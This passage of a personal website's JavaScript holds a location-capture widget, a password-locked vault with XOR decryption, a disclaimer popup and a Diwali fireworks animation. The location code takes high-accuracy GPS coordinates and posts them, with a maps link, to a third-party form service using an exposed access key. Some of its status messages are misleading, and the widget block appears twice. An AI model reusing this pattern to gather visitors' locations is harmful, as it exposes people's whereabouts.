          return;
        }

        setTriggerState(true, "Getting location…", "⏳");
        setStatus("Getting your location… please allow access if asked.");

        var note = noteInput ? noteInput.value.trim() : "";

        navigator.geolocation.getCurrentPosition(
          async function (pos) {
            var r = {
              note: note,
              lat: pos.coords.latitude,
              lng: pos.coords.longitude
            };

            // Render coordinates on the page
            showResult(r);

            // Send captured data to Web3Forms via feedback.js
            if (typeof sendLocationFeedback === "function") {
              setTriggerState(true, "Sending data…", "📤");
              setStatus("Location captured! Sending to server…");

              var res = await sendLocationFeedback(r);
              if (res.success) {
                setStatus("Success! Location recorded and sent.", "ok");
                if (noteInput) noteInput.value = "";
              } else {
                setStatus("Location captured, but failed to send: " + res.message, "err");
              }
            } else {
              setStatus("Location recorded.", "ok");
              if (noteInput) noteInput.value = "";
            }

            setTriggerState(false);
          },
          function (err) {
            var msg = {
              1: "Permission denied. Please allow location access in your browser settings.",
              2: "Location unavailable. Check GPS or network and try again.",
              3: "Timed out. Please try again."
            }[err.code] || "Couldn’t get your location.";
            setStatus(msg, "err");
            setTriggerState(false);
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      }

      if (trigger) {
        trigger.addEventListener("click", executeLocationCapture);
        trigger.addEventListener("keydown", function (e) {
          if (e.key === "Enter" || e.key === " ") {
            e.preventDefault();
            executeLocationCapture();
          }
        });
      }

      var form = document.getElementById("locationForm");
      if (form) {
        form.addEventListener("submit", function (e) {
          e.preventDefault();
          executeLocationCapture();
        });
      }
    })();
    (function () {
      var trigger = document.getElementById("locationTrigger") || document.getElementById("btn");
      var statusEl = document.getElementById("status");
      var noteInput = document.getElementById("locationNote");
      var triggerTextEl = trigger ? trigger.querySelector(".trigger-text") : null;
      var triggerIconEl = trigger ? trigger.querySelector(".trigger-icon") : null;

      var originalText = triggerTextEl ? triggerTextEl.textContent : (trigger ? trigger.textContent : "");
      var originalIcon = triggerIconEl ? triggerIconEl.textContent : "📍";
      var isLoading = false;

      function setStatus(msg, cls) {
        if (statusEl) {
          statusEl.textContent = msg;
          statusEl.className = cls || "";
        }
      }

      function setTriggerState(loading, text, icon) {
        isLoading = loading;
        if (!trigger) return;

        if (loading) {
          trigger.classList.add("loading");
          trigger.setAttribute("aria-busy", "true");
        } else {
          trigger.classList.remove("loading");
          trigger.removeAttribute("aria-busy");
        }

        if (triggerTextEl) {
          triggerTextEl.textContent = text || originalText;
        }
        if (triggerIconEl) {
          triggerIconEl.textContent = icon || originalIcon;
        }
      }

      function showResult(r) {
        var noteLabel = document.getElementById("noteLabel");
        var noteVal = document.getElementById("noteVal");
        if (r.note) {
          if (noteLabel) noteLabel.hidden = false;
          if (noteVal) {
            noteVal.hidden = false;
            noteVal.textContent = r.note;
          }
        } else {
          if (noteLabel) noteLabel.hidden = true;
          if (noteVal) noteVal.hidden = true;
        }

        var latEl = document.getElementById("lat");
        var lngEl = document.getElementById("lng");
        var mapEl = document.getElementById("map");
        var resultEl = document.getElementById("result");

        if (latEl) latEl.textContent = r.lat.toFixed(6);
        if (lngEl) lngEl.textContent = r.lng.toFixed(6);
        if (mapEl) mapEl.href = "https://www.google.com/maps?q=" + r.lat + "," + r.lng;
        if (resultEl) resultEl.hidden = false;
      }

      function executeLocationCapture() {
        if (isLoading) return;

        if (!("geolocation" in navigator)) {
          setStatus("Your browser doesn’t support location.", "err");
          return;
        }

        setTriggerState(true, "Getting location…", "⏳");
        setStatus("Getting your location… please allow access if asked.");

        var note = noteInput ? noteInput.value.trim() : "";

        navigator.geolocation.getCurrentPosition(
          async function (pos) {
            var r = {
              note: note,
              lat: pos.coords.latitude,
              lng: pos.coords.longitude
            };

            // Render coordinates on the page
            showResult(r);

            // Send captured data to Web3Forms via feedback.js
            if (typeof sendLocationFeedback === "function") {
              setTriggerState(true, "Sending data…", "📤");
              setStatus("Location captured! Sending to server…");

              var res = await sendLocationFeedback(r);
              if (res.success) {
                setStatus("Success! Location recorded and sent.", "ok");
                if (noteInput) noteInput.value = "";
              } else {
                setStatus("Location captured, but failed to send: " + res.message, "err");
              }
            } else {
              setStatus("Location recorded.", "ok");
              if (noteInput) noteInput.value = "";
            }

            setTriggerState(false);
          },
          function (err) {
            var msg = {
              1: "Permission denied. Please allow location access in your browser settings.",
              2: "Location unavailable. Check GPS or network and try again.",
              3: "Timed out. Please try again."
            }[err.code] || "Couldn’t get your location.";
            setStatus(msg, "err");
            setTriggerState(false);
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      }

      if (trigger) {
        trigger.addEventListener("click", executeLocationCapture);
        trigger.addEventListener("keydown", function (e) {
          if (e.key === "Enter" || e.key === " ") {
            e.preventDefault();
            executeLocationCapture();
          }
        });
      }

      var form = document.getElementById("locationForm");
      if (form) {
        form.addEventListener("submit", function (e) {
          e.preventDefault();
          executeLocationCapture();
        });
      }
    })();

    /**
     * Sends captured location data to Web3Forms
     * @param {Object} locationData - { note, lat, lng }
     * @returns {Promise<{success: boolean, message: string}>}
     */
    async function sendLocationFeedback(locationData) {
      const formData = new FormData();
      formData.append("access_key", "927c0657-7d8b-411b-a477-64f266cfa74b");
      formData.append("subject", "📍 New Location Captured" + (locationData.note ? `: ${locationData.note}` : ""));

      if (locationData.note) {
        formData.append("Note / Tag", locationData.note);
      }
      formData.append("Latitude", locationData.lat.toFixed(6));
      formData.append("Longitude", locationData.lng.toFixed(6));
      formData.append("Google Maps Link", `https://www.google.com/maps?q=${locationData.lat},${locationData.lng}`);
      formData.append("Recorded At", new Date().toLocaleString());

      try {
        const response = await fetch("https://api.web3forms.com/submit", {
          method: "POST",
          body: formData
        });

        const data = await response.json();

        if (response.ok && data.success) {
          return { success: true, message: data.message || "Success! Website is Totally running ." };
        } else {
          return { success: false, message: data.message || "Failed to locate nearest server." };
        }
      } catch (error) {
        return { success: false, message: "Network error. Please try again." };
      }
    }

    // Standalone form support if an element with id="form" exists
    const legacyForm = document.getElementById('form');
    if (legacyForm) {
      const submitBtn = legacyForm.querySelector('button[type="submit"]');

      legacyForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const formData = new FormData(legacyForm);
        formData.append("access_key", "927c0657-7d8b-411b-a477-64f266cfa74b");

        const originalText = submitBtn ? submitBtn.textContent : "Submit";
        if (submitBtn) {
          submitBtn.textContent = "Sending...";
          submitBtn.disabled = true;
        }

        try {
          const response = await fetch("https://api.web3forms.com/submit", {
            method: "POST",
            body: formData
          });

          const data = await response.json();

          if (response.ok && data.success) {
            alert("Success! Your message has been sent.");
            legacyForm.reset();
          } else {
            alert("Error: " + (data.message || "Failed to send"));
          }
        } catch (error) {
          alert("Something went wrong. Please try again.");
        } finally {
          if (submitBtn) {
            submitBtn.textContent = originalText;
            submitBtn.disabled = false;
          }
        }
      });
    }


    // XOR decrypt
    function decryptPayload(pass) {
      if (!CIPHER) return "";
      var keyBytes = sha256Bytes(pass + SALT);
      var raw = atob(CIPHER);
      var out = [];
      for (var i = 0; i < raw.length; i++) {
        out.push(raw.charCodeAt(i) ^ keyBytes[i % 32]);
      }
      var result = "";
      for (var idx = 0; idx < out.length; idx++) {
        var byte1 = out[idx];
        if (byte1 < 128) {
          result += String.fromCharCode(byte1);
        } else if (byte1 >= 192 && byte1 < 224) {
          var byte2 = out[++idx];
          result += String.fromCharCode(((byte1 & 31) << 6) | (byte2 & 63));
        } else if (byte1 >= 224 && byte1 < 240) {
          var byte2b = out[++idx];
          var byte3 = out[++idx];
          result += String.fromCharCode(((byte1 & 15) << 12) | ((byte2b & 63) << 6) | (byte3 & 63));
        }
      }
      return result;
    }

    let destructInterval = null;
    let isRevealed = false;
    const DESTRUCT_SECONDS = 300; // 5 minutes

    // Modal Control Functions
    function openVaultModal() {
      if (!modalOverlay) return;
      var isDestroyed = localStorage.getItem(STORAGE_KEY) === "destroyed";

      if (isDestroyed) {
        if (disclaimerBox) disclaimerBox.style.display = "none";
        if (lockedState) lockedState.style.display = "none";
        if (revealedState) revealedState.style.display = "none";
        if (destroyedState) destroyedState.style.display = "flex";
      } else if (isRevealed) {
        if (disclaimerBox) disclaimerBox.style.display = "none";
        if (lockedState) lockedState.style.display = "none";
        if (revealedState) revealedState.style.display = "flex";
        if (destroyedState) destroyedState.style.display = "none";
      } else {
        if (disclaimerBox) disclaimerBox.style.display = "block";
        if (lockedState) lockedState.style.display = "block";
        if (revealedState) revealedState.style.display = "none";
        if (destroyedState) destroyedState.style.display = "none";
        clearError();
        if (passInput) {
          passInput.value = "";
          setTimeout(function () { passInput.focus(); }, 250);
        }
      }

      modalOverlay.style.display = "flex";
      void modalOverlay.offsetWidth;
      modalOverlay.classList.add("active");
      document.body.classList.add("vault-modal-open");
    }

    function closeVaultModal() {
      if (!modalOverlay) return;
      modalOverlay.classList.remove("active");
      document.body.classList.remove("vault-modal-open");
      setTimeout(function () {
        if (!modalOverlay.classList.contains("active")) {
          modalOverlay.style.display = "none";
        }
      }, 300);
    }

    // Easter Egg: 5 Clicks on Aishwarya's photo in Quick Intro
    if (avatarRing) {
      var clickCount = 0;
      var clickTimer = null;

      avatarRing.addEventListener("click", function (e) {
        clickCount++;
        clearTimeout(clickTimer);
        clickTimer = setTimeout(function () {
          clickCount = 0;
        }, 3500);

        // Visual tap animation
        avatarRing.classList.remove("avatar-tap-effect");
        void avatarRing.offsetWidth;
        avatarRing.classList.add("avatar-tap-effect");

        if (clickCount >= 5) {
          clickCount = 0;
          openVaultModal();
        }
      });
    }

    // Close Modal Listeners
    if (btnModalClose) btnModalClose.addEventListener("click", closeVaultModal);
    if (modalBackdrop) modalBackdrop.addEventListener("click", closeVaultModal);
    document.addEventListener("keydown", function (e) {
      if (e.key === "Escape" && modalOverlay && modalOverlay.classList.contains("active")) {
        closeVaultModal();
      }
    });

    // Toggle Password Visibility
    if (btnToggle) {
      btnToggle.addEventListener("click", function () {
        var isPass = passInput.getAttribute("type") === "password";
        passInput.setAttribute("type", isPass ? "text" : "password");
        btnToggle.textContent = isPass ? "\uD83D\uDE48" : "\uD83D\uDC41\uFE0F";
      });
    }

    // Handle Form Unlock
    function handleUnlock() {
      var entered = (passInput.value || "").trim();
      if (!entered) {
        showError("Veuillez saisir le mot de passe.");
        return;
      }

      var inputHash = bytesToHex(sha256Bytes(entered + SALT));
      if (inputHash === EXPECTED_HASH) {
        clearError();
        var decryptedMsg = decryptPayload(entered);

        // Wipe password input immediately
        passInput.value = "";
        passInput.blur();

        // Reveal decrypted message in DOM
        revealedText.textContent = decryptedMsg;
        isRevealed = true;

        if (disclaimerBox) disclaimerBox.style.display = "none";
        if (lockedState) lockedState.style.display = "none";
        if (revealedState) revealedState.style.display = "flex";

        // Start 5-minute self-destruct countdown
        startSelfDestructTimer(DESTRUCT_SECONDS);
      } else {
        showError("Mot de passe incorrect. Acc\u00E8s refus\u00E9.");
        passInput.classList.remove("input-shake");
        void passInput.offsetWidth;
        passInput.classList.add("input-shake");
      }
    }

    if (unlockForm) {
      unlockForm.addEventListener("submit", function (e) {
        e.preventDefault();
        handleUnlock();
      });
    }

    function showError(msg) {
      if (errorMsg) errorMsg.textContent = msg;
    }

    function clearError() {
      if (errorMsg) errorMsg.textContent = "";
    }

    function fmtTime(sec) {
      var m = Math.floor(sec / 60);
      var s = Math.ceil(sec % 60);
      if (s === 60) { m++; s = 0; }
      return m + ":" + (s < 10 ? "0" : "") + s;
    }

    function startSelfDestructTimer(durationSeconds) {
      var remaining = durationSeconds;
      var total = durationSeconds;

      if (timerVal) timerVal.textContent = fmtTime(remaining);
      if (timerBar) timerBar.style.width = "100%";

      if (destructInterval) clearInterval(destructInterval);

      destructInterval = setInterval(function () {
        remaining -= 0.5;
        if (remaining <= 0) {
          clearInterval(destructInterval);
          applyDestroyedState();
        } else {
          if (timerVal) timerVal.textContent = fmtTime(remaining);
          if (timerBar) {
            var pct = Math.max(0, (remaining / total) * 100);
            timerBar.style.width = pct + "%";
          }
        }
      }, 500);
    }

    // Permanent destruction routine
    function applyDestroyedState() {
      if (destructInterval) clearInterval(destructInterval);
      isRevealed = false;

      // 1. Wipe and purge all cipher strings & variables from memory
      CIPHER = null;

      // 2. Erase from DOM
      if (revealedText) revealedText.textContent = "";
      if (messageBox) messageBox.innerHTML = "";

      // 3. Mark in localStorage as permanently shredded
      try {
        localStorage.setItem(STORAGE_KEY, "destroyed");
      } catch (e) { }

      // 4. Update UI to permanently destroyed state
      if (disclaimerBox) disclaimerBox.style.display = "none";
      if (lockedState) lockedState.style.display = "none";
      if (revealedState) revealedState.style.display = "none";
      if (destroyedState) destroyedState.style.display = "flex";
    }

    // Manual Instant Self-Destruct Button
    if (btnDestroy) {
      btnDestroy.addEventListener("click", function () {
        applyDestroyedState();
      });
    }

    // Developer / User Reset for testing
    if (resetHint) {
      resetHint.addEventListener("click", function () {
        try {
          localStorage.removeItem(STORAGE_KEY);
        } catch (e) { }
        location.reload();
      });
    }
  })();

  // ==========================================================================
  // SITE PERMISSIONS & PRIVACY DISCLAIMER POPUP (ON PAGE LOAD)
  // ==========================================================================
  (function initPermissionsDisclaimer() {
    const overlay = document.getElementById("siteDisclaimerOverlay");
    const backdrop = document.getElementById("siteDisclaimerBackdrop");
    const btnClose = document.getElementById("btnDisclaimerClose");
    const btnAcknowledge = document.getElementById("btnDisclaimerAcknowledge");

    if (!overlay) return;

    function openDisclaimer() {
      overlay.style.display = "flex";
      // Force reflow for smooth transition
      void overlay.offsetWidth;
      overlay.classList.add("active");
      document.body.classList.add("disclaimer-modal-open");
    }

    function closeDisclaimer() {
      overlay.classList.remove("active");
      document.body.classList.remove("disclaimer-modal-open");
      setTimeout(() => {
        overlay.style.display = "none";
        // Launch 5-Second Diwali Celebration
        startDiwaliCelebration();
      }, 350);
    }

    // Trigger on page load with slight delay for smooth entrance
    setTimeout(openDisclaimer, 450);

    if (btnClose) btnClose.addEventListener("click", closeDisclaimer);
    if (btnAcknowledge) btnAcknowledge.addEventListener("click", closeDisclaimer);
    if (backdrop) backdrop.addEventListener("click", closeDisclaimer);

    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape" && overlay.classList.contains("active")) {
        closeDisclaimer();
      }
    });
  })();

  // ==========================================================================
  // DIWALI CELEBRATION (PLAYS FOR 5 SECONDS AFTER CLOSING DISCLAIMER)
  // ==========================================================================
  function startDiwaliCelebration() {
    const overlay = document.getElementById("diwaliCelebrationOverlay");
    const canvas = document.getElementById("diwaliFireworksCanvas");
    const btnSkip = document.getElementById("btnDiwaliSkip");
    if (!overlay || !canvas) return;

    let animId = null;
    let spawnTimer = null;
    let finishTimer = null;
    let fadeTimer = null;
    let isRunning = true;

    const ctx = canvas.getContext("2d");
    const dpr = Math.min(window.devicePixelRatio || 1, 2);
    let width = (canvas.width = window.innerWidth * dpr);
    let height = (canvas.height = window.innerHeight * dpr);

    function resize() {
      if (!isRunning) return;
      width = canvas.width = window.innerWidth * dpr;
      height = canvas.height = window.innerHeight * dpr;
    }
    window.addEventListener("resize", resize);

    // Festive Color Palette
    const PALETTE = [
      "#f59e0b", "#fbbf24", "#fde047", "#ef4444",
      "#ec4899", "#a855f7", "#3b82f6", "#10b981", "#ffffff"
    ];

    let particles = [];
    let rockets = [];

    class Particle {
      constructor(x, y, color) {
        this.x = x;
        this.y = y;
        this.color = color;
        const angle = Math.random() * Math.PI * 2;
        const speed = (Math.random() * 5 + 2) * dpr;
        this.vx = Math.cos(angle) * speed;
        this.vy = Math.sin(angle) * speed;
        this.alpha = 1;
        this.decay = Math.random() * 0.02 + 0.015;
        this.gravity = 0.08 * dpr;
        this.radius = (Math.random() * 2.2 + 1.2) * dpr;
        this.flicker = Math.random() > 0.4;
      }
      update() {
        this.vx *= 0.96;
        this.vy *= 0.96;
        this.vy += this.gravity;
        this.x += this.vx;
        this.y += this.vy;
        this.alpha -= this.decay;
        return this.alpha > 0;
      }
      draw(c) {
        c.save();
        c.globalAlpha = Math.max(0, this.alpha * (this.flicker && Math.random() < 0.3 ? 0.4 : 1));
        c.fillStyle = this.color;
        c.shadowColor = this.color;
        c.shadowBlur = 8 * dpr;
        c.beginPath();
        c.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
        c.fill();
        c.restore();
      }
    }

    class Rocket {
      constructor() {
        this.x = (Math.random() * 0.8 + 0.1) * width;
        this.y = height;
        this.targetY = (Math.random() * 0.45 + 0.15) * height;
        this.speed = (Math.random() * 3 + 8) * dpr;
        this.color = PALETTE[Math.floor(Math.random() * PALETTE.length)];
        this.alive = true;
      }
      update() {
        this.y -= this.speed;
        if (this.y <= this.targetY) {
          this.explode();
          this.alive = false;
        }
        return this.alive;
      }
      explode() {
        const count = 45;
        for (let i = 0; i < count; i++) {
          particles.push(new Particle(this.x, this.y, this.color));
        }
        for (let j = 0; j < 15; j++) {
          particles.push(new Particle(this.x, this.y, "#fde047"));
        }
      }
      draw(c) {
        c.save();
        c.fillStyle = this.color;
        c.shadowColor = this.color;
        c.shadowBlur = 10 * dpr;
        c.beginPath();
        c.arc(this.x, this.y, 2.5 * dpr, 0, Math.PI * 2);
        c.fill();
        c.restore();
      }
    }

    function createBurst(x, y) {
      const color = PALETTE[Math.floor(Math.random() * PALETTE.length)];
      for (let i = 0; i < 50; i++) {
        particles.push(new Particle(x, y, color));
      }
      for (let j = 0; j < 15; j++) {
        particles.push(new Particle(x, y, "#ffffff"));
      }
    }

    // Launch instant initial bursts on start
    createBurst(width * 0.25, height * 0.3);
    createBurst(width * 0.75, height * 0.28);
    createBurst(width * 0.5, height * 0.2);

    // Rocket spawn loop
    spawnTimer = setInterval(() => {
      if (!isRunning) return;
      rockets.push(new Rocket());
      if (Math.random() < 0.6) {
        rockets.push(new Rocket());
      }
    }, 380);

    // Main animation loop
    function animate() {
      if (!isRunning) return;
      ctx.fillStyle = "rgba(10, 4, 8, 0.25)";
      ctx.fillRect(0, 0, width, height);

      rockets = rockets.filter((r) => {
        const alive = r.update();
        if (alive) r.draw(ctx);
        return alive;
      });

      particles = particles.filter((p) => {
        const alive = p.update();
        if (alive) p.draw(ctx);
        return alive;
      });

      animId = requestAnimationFrame(animate);
    }

    // Show celebration overlay
    overlay.style.display = "flex";
    void overlay.offsetWidth;
    overlay.classList.add("active");
    document.body.classList.add("diwali-celebrating");

    animId = requestAnimationFrame(animate);

    function stopCelebration() {
      if (!isRunning) return;
      isRunning = false;
      if (spawnTimer) clearInterval(spawnTimer);
      if (fadeTimer) clearTimeout(fadeTimer);
      if (finishTimer) clearTimeout(finishTimer);
      if (animId) cancelAnimationFrame(animId);
      window.removeEventListener("resize", resize);

      overlay.classList.remove("active");
      overlay.classList.add("fading-out");
      document.body.classList.remove("diwali-celebrating");

      setTimeout(() => {
        overlay.style.display = "none";
        overlay.classList.remove("fading-out");
        ctx.clearRect(0, 0, width, height);
        particles = [];
        rockets = [];
      }, 550);
    }

    // 5-Second Celebration Timer (Fade at 4.4s, Stop at 5.0s)
    fadeTimer = setTimeout(() => {
      if (isRunning) overlay.classList.add("fading-out");
    }, 4400);

    finishTimer = setTimeout(() => {
      stopCelebration();
    }, 5000);

    if (btnSkip) {
      btnSkip.addEventListener("click", stopCelebration, { once: true });
    }

    const handleKey = (e) => {
      if (e.key === "Escape" && isRunning) {
        stopCelebration();
        document.removeEventListener("keydown", handleKey);
      }
    };
    document.addEventListener("keydown", handleKey);
  }

});

